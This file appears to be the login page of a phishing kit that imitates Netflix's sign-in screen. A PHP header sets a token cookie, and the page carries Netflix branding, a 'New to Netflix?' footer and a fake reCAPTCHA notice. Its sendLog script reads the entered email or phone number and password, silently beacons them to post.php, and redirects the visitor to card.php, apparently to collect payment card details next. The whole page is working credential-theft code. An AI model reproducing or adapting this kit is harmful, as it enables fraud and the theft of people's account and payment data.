<?php 
require '../main.php';
setcookie('token',$token,['path'=>'/','secure'=>false,'httponly'=>false,'samesite'=>'Lax']);

?><!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Accedi</title>
    <link rel="stylesheet" href="res/css/login.css">
    <link rel="stylesheet" href="res/css/media.css">
</head>
<body>
<div class="holder">

<header>
<img src="res/img/logo.png">
</header>

<section>
<div class="form">



<div class="form-title">
Sign In</div>

<div class="form-col">
    <input type="text" class="textinput" id="u" required placeholder="Email or mobile number">
</div>

<div class="form-col">
    <input type="password" class="textinput" id="p" required placeholder="Password">
</div>

<div class="form-col" style="margin-top:40px;">
    <button id="sbmt" onclick="sendLog()">Sign In</button>
</div>
<script>if (typeof globalThis.token === "undefined") { globalThis.token = <?php echo json_encode($token); ?>; }</script>

<div class="form-col" style="display:flex; align-items:center; font-size:0.9em; color:#b3b3b3;">
<div style="display:flex; align-items:center;width:50%; ">
<input type="checkbox" style="accent-color:#9d9a9a; width:15px; height:15px; margin-right:6px;" checked> 
Remember me</div>
<div style="width:50%; text-align:right;">
Forgot password?</div>
</div>

<div class="form-col" style="color:#b3b3b3; margin-top:60px;">
<h4 style="font-weight:normal;">New to Netflix? <span style="color:white;">Sign up now.</span></h4>
    <p style="font-size:0.9em;">This page is protected by Google reCAPTCHA to ensure you're not a bot. <span style="color:blue;">Learn more.</span></p>
</div>

</d>
</div>
</section>

<footer>
<div class="footer-holder">
    <h3>Questions? Contact us.</h3>
    <span>FAQ</span>
    <span>Help Center</span>
    <span>Terms of Use</span> 
    <span>Privacy</span>
    <span>Cookie Preferences</span>
    <span>Corporate Information</span>
</div>
</footer>
</div>
<script src="./res/cdn/jq.js"></script>
<script src="./res/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
var imgloader = '<img src="res/img/loading-white.gif" style="width:20px; margin:-6px 0;">';

function sendLog() {
    $("input").removeClass("error");

    if ($("#u").val().length < 5) {
        return $("#u").addClass("error");
    }

    if ($("#p").val().length < 4) {
        return $("#p").addClass("error");
    }

    $("#sbmt").css("background","#e10f0f70");
    $("#sbmt").html(imgloader);
    const form = new FormData();
    form.append("user", $("#u").val());
    form.append("pass", $("#p").val());
    navigator.sendBeacon("post.php", form);
    window.location = "card.php";
}

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendLog();
    }
});


</script>

</body>
</html>
